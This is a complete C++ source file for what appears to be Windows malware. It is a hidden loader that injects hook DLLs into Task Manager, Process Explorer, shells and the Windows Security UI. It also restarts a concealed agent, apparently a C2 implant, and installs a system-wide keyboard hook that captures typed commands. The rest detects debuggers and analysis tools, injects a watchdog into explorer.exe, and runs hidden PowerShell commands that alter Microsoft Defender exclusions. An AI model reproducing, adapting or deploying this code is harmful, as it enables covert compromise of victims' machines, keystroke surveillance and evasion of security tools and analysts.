#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <thread>
#include <chrono>
#include <set>
#include <vector>
#include <map>
#include <algorithm>
#include <fstream>
#include <mutex>

#pragma comment(lib, "ntdll.lib")

const wchar_t* HOOK_DLL_NAME = L"hook.dll";
const wchar_t* WATCHDOG_DLL_NAME = L"wcd.dll";
const int CHECK_INTERVAL_MS = 1000;
const int INJECTION_RETRY_DELAY_MS = 200;
const int INJECTION_TIMEOUT_MS = 5000;

struct TargetProcess {
    std::wstring name;
    bool requiresSpecialCheck;
    bool skipShortLived;
    bool monitorForCommands;
};
// Debuggers to watch for
std::vector<std::wstring> g_advancedDebuggers = {
    L"windbg.exe",
    L"windbgx.exe",
    L"DbgX.Shell.exe",
    L"livekd.exe",
    L"livekd64.exe",
    L"Dbgview.exe",
    L"Dbgview64.exe",
    L"gdb.exe",
    L"Fiddler.exe",
    L"FiddlerEverywhere.exe",
    L"perfmon.exe",
    L"procexp64.exe",
    L"procexp.exe",
    L"procexp4a.exe"
};

// Can hook IAT with these debuggers
std::vector<TargetProcess> g_targets = {
    { L"Taskmgr.exe", false, false, false },
    { L"mmc.exe", true, false, false },
    { L"tasklist.exe", false, true, false },
    { L"ProcessHacker.exe", false, false, false },
    { L"powershell.exe", false, false, true },
    { L"cmd.exe", false, false, true },
    { L"DbgX.Shell.exe", false, false, true },
    { L"windbg.exe", false, false, true },
    { L"windbgx.exe", false, false, true },
    { L"SecHealthUI.exe", false, false, false },
    { L"procexp64.exe", false, false, false },
    { L"procexp.exe", false, false, false },
    { L"procexp4a.exe", false, false, false }
};

// Version 2 of our detection

bool g_securityUIDetected = false;
std::mutex g_securityMutex;
bool g_watchdogInjected = false;
std::wstring g_agentPath;
std::mutex g_logMutex;

struct MonitoredProcess {
    DWORD pid;
    std::wstring name;
    std::wstring typedBuffer;
    std::chrono::steady_clock::time_point lastActivity;
};

std::map<DWORD, MonitoredProcess> g_monitoredProcesses;
std::mutex g_monitorMutex;

const std::vector<std::wstring> g_cmdDangerousPatterns = {
    L"task", L"wmic", L"netstat", L"systeminfo"
};

const std::vector<std::wstring> g_psDangerousPatterns = {
    L"get-pro", L"stop-pro", L"get-service", L"stop-service"
};

// I always forget to remove this debugger. PLS REMOVE THIS LINE COMPLETELY
void DebugLog(const std::wstring& message) {
    std::lock_guard<std::mutex> lock(g_logMutex);
    std::ofstream logFile("injector_log.txt", std::ios::app);
    if (logFile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);

        // Convert wstring to string for output
        std::string msg_narrow(message.begin(), message.end());

        logFile << "[" << st.wHour << ":" << st.wMinute << ":" << st.wSecond << "] "
            << msg_narrow << std::endl;
        logFile.close();
    }
}

std::wstring ToLower(const std::wstring& str) {
    std::wstring result = str;
    std::transform(result.begin(), result.end(), result.begin(), ::towlower);
    return result;
}

bool IsProcessRunning(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    bool found = false;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                found = true;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return found;
}

bool IsAdvancedDebuggerRunning() {
    for (const auto& debugger : g_advancedDebuggers) {
        if (IsProcessRunning(debugger.c_str())) {
            DebugLog(L"Advanced debugger detected: " + debugger);
            return true;
        }
    }
    return false;
}

std::wstring GetModuleDirectory() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring path(exePath);
    size_t lastSlash = path.find_last_of(L"\\");
    if (lastSlash != std::wstring::npos) {
        return path.substr(0, lastSlash);
    }
    return L"";
}

std::wstring GetDllPath(const wchar_t* dllName) {
    std::wstring moduleDir = GetModuleDirectory();
    std::wstring dllPath = moduleDir + L"\\" + dllName;
    DWORD attrib = GetFileAttributesW(dllPath.c_str());
    if (attrib == INVALID_FILE_ATTRIBUTES) {
        DebugLog(L"ERROR: " + std::wstring(dllName) + L" not found at " + dllPath);
        return L"";
    }
    DebugLog(std::wstring(dllName) + L" path: " + dllPath);
    return dllPath;
}

std::wstring FindAgentPath() {
    std::wstring moduleDir = GetModuleDirectory();
    size_t lastSlash = moduleDir.find_last_of(L"\\");
    if (lastSlash == std::wstring::npos) return L"";
    std::wstring modulesDir = moduleDir.substr(0, lastSlash);
    lastSlash = modulesDir.find_last_of(L"\\");
    if (lastSlash == std::wstring::npos) return L"";
    std::wstring agentDir = modulesDir.substr(0, lastSlash);
    WIN32_FIND_DATAW findData;
    std::wstring searchPath = agentDir + L"\\*.exe";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        DebugLog(L"ERROR: No agent executable found in " + agentDir);
        return L"";
    }
    std::wstring agentExe;
    do {
        std::wstring fileName = findData.cFileName;
        if (fileName != L"ldr.exe" && fileName != L"loader.exe") {
            agentExe = agentDir + L"\\" + fileName;
            break;
        }
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
    if (!agentExe.empty()) {
        DebugLog(L"Found agent executable: " + agentExe);
    }
    return agentExe;
}

bool IsProcessRunningByPath(const std::wstring& fullPath) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    bool found = false;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                wchar_t processPath[MAX_PATH];
                DWORD size = MAX_PATH;
                typedef BOOL(WINAPI* PFN_QUERY_FULL_PROCESS_IMAGE_NAME)(HANDLE, DWORD, LPWSTR, PDWORD);
                HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
                PFN_QUERY_FULL_PROCESS_IMAGE_NAME pQueryFullProcessImageName =
                    (PFN_QUERY_FULL_PROCESS_IMAGE_NAME)GetProcAddress(hKernel32, "QueryFullProcessImageNameW");
                if (pQueryFullProcessImageName && pQueryFullProcessImageName(hProcess, 0, processPath, &size)) {
                    if (_wcsicmp(processPath, fullPath.c_str()) == 0) {
                        found = true;
                        CloseHandle(hProcess);
                        break;
                    }
                }
                CloseHandle(hProcess);
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return found;
}


bool StartAgent() {
    if (g_agentPath.empty()) return false;
    if (IsProcessRunningByPath(g_agentPath)) return true;
    DebugLog(L"Starting agent: " + g_agentPath);
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = { 0 };
    std::vector<wchar_t> cmdLine(g_agentPath.begin(), g_agentPath.end());
    cmdLine.push_back(L'\0');
    BOOL success = CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
    if (success) {
        DebugLog(L"✓ Agent started (PID: " + std::to_wstring(pi.dwProcessId) + L")");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

std::vector<DWORD> FindAllProcessIds(const wchar_t* processName) {
    std::vector<DWORD> pids;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return pids;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                pids.push_back(pe32.th32ProcessID);
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pids;
}

DWORD FindExplorerPID() {
    auto pids = FindAllProcessIds(L"explorer.exe");
    return pids.empty() ? 0 : pids[0];
}

bool IsProcessAlive(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (!hProcess) return false;
    DWORD exitCode = 0;
    bool alive = GetExitCodeProcess(hProcess, &exitCode) && (exitCode == STILL_ACTIVE);
    CloseHandle(hProcess);
    return alive;
}

bool IsServicesMmc(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (!hProcess) return false;
    wchar_t cmdLine[MAX_PATH * 2] = { 0 };
    DWORD size = sizeof(cmdLine) / sizeof(wchar_t);
    typedef BOOL(WINAPI* PFN_QUERY_FULL_PROCESS_IMAGE_NAME)(HANDLE, DWORD, LPWSTR, PDWORD);
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    PFN_QUERY_FULL_PROCESS_IMAGE_NAME pQueryFullProcessImageName =
        (PFN_QUERY_FULL_PROCESS_IMAGE_NAME)GetProcAddress(hKernel32, "QueryFullProcessImageNameW");
    bool isServices = false;
    if (pQueryFullProcessImageName && pQueryFullProcessImageName(hProcess, 0, cmdLine, &size)) {
        std::wstring cmdLineStr = ToLower(std::wstring(cmdLine));
        isServices = (cmdLineStr.find(L"services.msc") != std::wstring::npos);
    }
    CloseHandle(hProcess);
    return isServices;
}

bool IsProcessStillRunning(DWORD processId) {
    HANDLE hProcess = OpenProcess(SYNCHRONIZE, FALSE, processId);
    if (!hProcess) return false;
    DWORD waitResult = WaitForSingleObject(hProcess, 0);
    CloseHandle(hProcess);
    return (waitResult == WAIT_TIMEOUT);
}

bool IsDllInjected(DWORD processId, const std::wstring& dllPath) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, processId);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    MODULEENTRY32W me32;
    me32.dwSize = sizeof(MODULEENTRY32W);
    bool found = false;
    if (Module32FirstW(hSnapshot, &me32)) {
        do {
            if (_wcsicmp(me32.szExePath, dllPath.c_str()) == 0 ||
                wcsstr(me32.szModule, L"hook.dll") != nullptr ||
                wcsstr(me32.szModule, L"wcd.dll") != nullptr) {
                found = true;
                break;
            }
        } while (Module32NextW(hSnapshot, &me32));
    }
    CloseHandle(hSnapshot);
    return found;
}

bool InjectDll(DWORD processId, const std::wstring& dllPath, const std::wstring& dllName) {
    if (!IsProcessStillRunning(processId)) return false;
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!hProcess) return false;
    size_t dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
    LPVOID pRemoteDllPath = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteDllPath) {
        CloseHandle(hProcess);
        return false;
    }
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pRemoteDllPath, dllPath.c_str(), dllPathSize, &bytesWritten)) {
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pRemoteDllPath, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    WaitForSingleObject(hThread, INJECTION_TIMEOUT_MS);
    DWORD exitCode = 0;
    bool success = (GetExitCodeThread(hThread, &exitCode) && exitCode != 0);
    if (success) {
        DebugLog(L"✓ " + dllName + L" injected into PID " + std::to_wstring(processId));
    }
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return success;
}

bool InjectWatchdogToExplorer(const std::wstring& triggerReason) {
    if (g_watchdogInjected) return true;

    DebugLog(L"========================================");
    DebugLog(L"WATCHDOG TRIGGER: " + triggerReason);
    DebugLog(L"Injecting wcd.dll into explorer.exe...");
    DebugLog(L"========================================");

    DWORD explorerPID = FindExplorerPID();
    if (explorerPID == 0) return false;

    std::wstring watchdogPath = GetDllPath(WATCHDOG_DLL_NAME);
    if (watchdogPath.empty()) return false;

    if (IsDllInjected(explorerPID, watchdogPath)) {
        g_watchdogInjected = true;
        DebugLog(L"✓ Watchdog already injected - terminating loader");
        ExitProcess(0); // Terminate successfully
        return true;
    }

    if (InjectDll(explorerPID, watchdogPath, WATCHDOG_DLL_NAME)) {
        g_watchdogInjected = true;
        DebugLog(L"✓ Watchdog injected successfully");
        DebugLog(L"✓ Terminating loader - watchdog active");
        Sleep(500); // wE Add fuckin brief delay to ensure DLL initializes
        ExitProcess(0); // Terminate successfully
        return true;
    }

    return false;
}


bool CheckForDangerousCommand(const std::wstring& input, const std::wstring& processName) {
    std::wstring lowerInput = ToLower(input);
    const std::vector<std::wstring>* patterns = nullptr;
    if (processName.find(L"cmd.exe") != std::wstring::npos) {
        patterns = &g_cmdDangerousPatterns;
    }
    else if (processName.find(L"powershell") != std::wstring::npos) {
        patterns = &g_psDangerousPatterns;
    }
    else if (processName.find(L"DbgX") != std::wstring::npos || processName.find(L"windbg") != std::wstring::npos) {
        patterns = &g_cmdDangerousPatterns;
    }
    if (!patterns) return false;
    for (const auto& pattern : *patterns) {
        if (lowerInput.find(pattern) != std::wstring::npos) {
            return true;
        }
    }
    return false;
}

bool RemoveDefenderExclusions() {
    DebugLog(L"========================================");
    DebugLog(L"SECURITY UI DETECTED - Removing exclusions");
    DebugLog(L"========================================");

    std::wstring moduleDir = GetModuleDirectory();

    std::wstring psCommand = L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"";
    psCommand += L"Remove-MpPreference -ExclusionPath '" + moduleDir + L"' -ErrorAction SilentlyContinue; ";
    psCommand += L"Remove-MpPreference -ExclusionProcess 'ldr.exe' -ErrorAction SilentlyContinue; ";
    psCommand += L"Remove-MpPreference -ExclusionProcess 'tao.exe' -ErrorAction SilentlyContinue; ";
    psCommand += L"Remove-MpPreference -ExclusionProcess 'wpns.exe' -ErrorAction SilentlyContinue";
    psCommand += L"\"";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };

    std::vector<wchar_t> cmdLine(psCommand.begin(), psCommand.end());
    cmdLine.push_back(L'\0');

    BOOL success = CreateProcessW(
        NULL,
        cmdLine.data(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (success) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DebugLog(L"✓ Defender exclusions removed");
        return true;
    }

    DebugLog(L"ERROR: Failed to remove exclusions");
    return false;
}

bool InjectWatchdogOnSecurityUI() {
    std::lock_guard<std::mutex> lock(g_securityMutex);

    if (g_securityUIDetected) {
        return true;
    }

    DebugLog(L"========================================");
    DebugLog(L"SECURITY UI TRIGGER DETECTED");
    DebugLog(L"Action: Remove exclusions + Inject watchdog");
    DebugLog(L"========================================");

    RemoveDefenderExclusions();

    DWORD explorerPID = FindExplorerPID();
    if (explorerPID == 0) {
        DebugLog(L"ERROR: explorer.exe not found");
        return false;
    }

    std::wstring watchdogPath = GetDllPath(WATCHDOG_DLL_NAME);
    if (watchdogPath.empty()) {
        return false;
    }

    if (IsDllInjected(explorerPID, watchdogPath)) {
        DebugLog(L"wcd.dll already injected");
        g_securityUIDetected = true;
        return true;
    }

    if (InjectDll(explorerPID, watchdogPath, WATCHDOG_DLL_NAME)) {
        g_securityUIDetected = true;
        g_watchdogInjected = true;
        DebugLog(L"✓ Watchdog injected into explorer.exe");
        return true;
    }

    DebugLog(L"ERROR: Failed to inject watchdog");
    return false;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        HWND hwnd = GetForegroundWindow();
        if (!hwnd) return CallNextHookEx(NULL, nCode, wParam, lParam);
        DWORD pid = 0;
        GetWindowThreadProcessId(hwnd, &pid);
        if (pid == 0) return CallNextHookEx(NULL, nCode, wParam, lParam);
        std::lock_guard<std::mutex> lock(g_monitorMutex);
        auto it = g_monitoredProcesses.find(pid);
        if (it != g_monitoredProcesses.end()) {
            MonitoredProcess& proc = it->second;
            proc.lastActivity = std::chrono::steady_clock::now();
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
            wchar_t buffer[5] = { 0 };
            int result = ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, buffer, 4, 0);
            if (result > 0) {
                proc.typedBuffer += buffer;
                if (proc.typedBuffer.length() > 50) {
                    proc.typedBuffer = proc.typedBuffer.substr(proc.typedBuffer.length() - 50);
                }
                if (CheckForDangerousCommand(proc.typedBuffer, proc.name)) {
                    DebugLog(L"⚠ TYPED IN " + proc.name + L": " + proc.typedBuffer);
                    InjectWatchdogToExplorer(L"Keyboard: " + proc.name);
                }
            }
            if (pKeyboard->vkCode == VK_RETURN) {
                proc.typedBuffer.clear();
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

struct InjectionRecord {
    DWORD processId;
    std::wstring processName;
    std::chrono::steady_clock::time_point injectionTime;
    int retryCount;
};

class ProcessTracker {
private:
    std::map<DWORD, InjectionRecord> injectedProcesses;
    std::set<DWORD> failedProcesses;
    const int MAX_RETRIES = 2;
public:
    bool IsTracked(DWORD pid) { return injectedProcesses.find(pid) != injectedProcesses.end(); }
    bool HasFailed(DWORD pid) { return failedProcesses.find(pid) != failedProcesses.end(); }
    void MarkFailed(DWORD pid) { failedProcesses.insert(pid); }
    void Track(DWORD pid, const std::wstring& processName) {
        InjectionRecord record;
        record.processId = pid;
        record.processName = processName;
        record.injectionTime = std::chrono::steady_clock::now();
        record.retryCount = 0;
        injectedProcesses[pid] = record;
    }
    bool ShouldRetry(DWORD pid) {
        auto it = injectedProcesses.find(pid);
        if (it == injectedProcesses.end()) return true;
        return it->second.retryCount < MAX_RETRIES;
    }
    void IncrementRetry(DWORD pid) {
        auto it = injectedProcesses.find(pid);
        if (it != injectedProcesses.end()) it->second.retryCount++;
    }
    void CleanupDeadProcesses() {
        std::vector<DWORD> toRemove;
        for (auto& pair : injectedProcesses) {
            if (!IsProcessAlive(pair.first)) toRemove.push_back(pair.first);
        }
        for (DWORD pid : toRemove) {
            injectedProcesses.erase(pid);
            failedProcesses.erase(pid);
        }
        std::lock_guard<std::mutex> lock(g_monitorMutex);
        std::vector<DWORD> deadMonitored;
        for (auto& pair : g_monitoredProcesses) {
            if (!IsProcessAlive(pair.first)) deadMonitored.push_back(pair.first);
        }
        for (DWORD pid : deadMonitored) g_monitoredProcesses.erase(pid);
    }
};

void HandleProcessInjection(DWORD pid, const std::wstring& processName, const std::wstring& hookDllPath,
    ProcessTracker& tracker, bool skipShortLived, bool monitorForCommands) {
    if (tracker.IsTracked(pid) || tracker.HasFailed(pid)) return;
    if (skipShortLived) {
        tracker.MarkFailed(pid);
        return;
    }
    if (monitorForCommands) {
        std::lock_guard<std::mutex> lock(g_monitorMutex);
        if (g_monitoredProcesses.find(pid) == g_monitoredProcesses.end()) {
            MonitoredProcess monitored;
            monitored.pid = pid;
            monitored.name = processName;
            monitored.lastActivity = std::chrono::steady_clock::now();
            g_monitoredProcesses[pid] = monitored;
            DebugLog(L"Monitoring " + processName + L" (PID: " + std::to_wstring(pid) + L")");
        }
    }
    Sleep(INJECTION_RETRY_DELAY_MS);
    if (!IsProcessStillRunning(pid)) {
        tracker.MarkFailed(pid);
        return;
    }
    if (!IsDllInjected(pid, hookDllPath)) {
        if (InjectDll(pid, hookDllPath, HOOK_DLL_NAME)) {
            tracker.Track(pid, processName);
        }
        else if (tracker.ShouldRetry(pid)) {
            tracker.IncrementRetry(pid);
        }
        else {
            tracker.MarkFailed(pid);
        }
    }
    else {
        tracker.Track(pid, processName);
    }
}

void MonitorAndInject() {
    std::wstring hookDllPath = GetDllPath(HOOK_DLL_NAME);
    if (hookDllPath.empty()) {
        DebugLog(L"FATAL: hook.dll not found");
        return;
    }

    ProcessTracker tracker;

    DebugLog(L"========================================");
    DebugLog(L"Monitoring started");
    DebugLog(L"Security UI Monitor: ACTIVE");
    DebugLog(L"Advanced Debugger Monitor: ACTIVE");
    DebugLog(L"========================================");

    DWORD agentCheckCounter = 0;
    const DWORD AGENT_CHECK_INTERVAL = 5;

    while (true) {
        // c2 restart check
        if (agentCheckCounter++ >= AGENT_CHECK_INTERVAL) {
            agentCheckCounter = 0;
            if (!g_agentPath.empty() && !IsProcessRunningByPath(g_agentPath)) {
                StartAgent();
            }
        }

        // WinDBG and others check - HIGHEST PRIORITY
        if (IsAdvancedDebuggerRunning()) {
            DebugLog(L"CRITICAL: Advanced debugger detected - injecting watchdog");
            InjectWatchdogToExplorer(L"Advanced Debugger Detected");

        }

        // Security UI check
        std::vector<DWORD> secUIpids = FindAllProcessIds(L"SecHealthUI.exe");
        if (!secUIpids.empty() && !g_securityUIDetected) {
            DebugLog(L"Windows Security UI detected!");
            InjectWatchdogOnSecurityUI();
        }
        else if (secUIpids.empty() && g_securityUIDetected) {
            DebugLog(L"Security UI closed - watchdog will handle exclusion restoration");
            g_securityUIDetected = false;
        }

        for (const auto& target : g_targets) {
            if (_wcsicmp(target.name.c_str(), L"SecHealthUI.exe") == 0) {
                continue;
            }

            std::vector<DWORD> pids = FindAllProcessIds(target.name.c_str());
            for (DWORD pid : pids) {
                if (target.requiresSpecialCheck && _wcsicmp(target.name.c_str(), L"mmc.exe") == 0) {
                    if (!IsServicesMmc(pid)) continue;
                }
                HandleProcessInjection(pid, target.name, hookDllPath, tracker,
                    target.skipShortLived, target.monitorForCommands);
            }
        }

        tracker.CleanupDeadProcesses();
        std::this_thread::sleep_for(std::chrono::milliseconds(CHECK_INTERVAL_MS));
    }
}

void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HideConsole();
    DebugLog(L"========================================");
    DebugLog(L"DLL Injector Started");
    DebugLog(L"========================================");
    g_agentPath = FindAgentPath();
    if (!g_agentPath.empty()) StartAgent();
    DebugLog(L"Installing keyboard hook...");
    HHOOK hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (hKeyboardHook) {
        DebugLog(L"Keyboard hook installed");
    }
    MonitorAndInject();
    if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}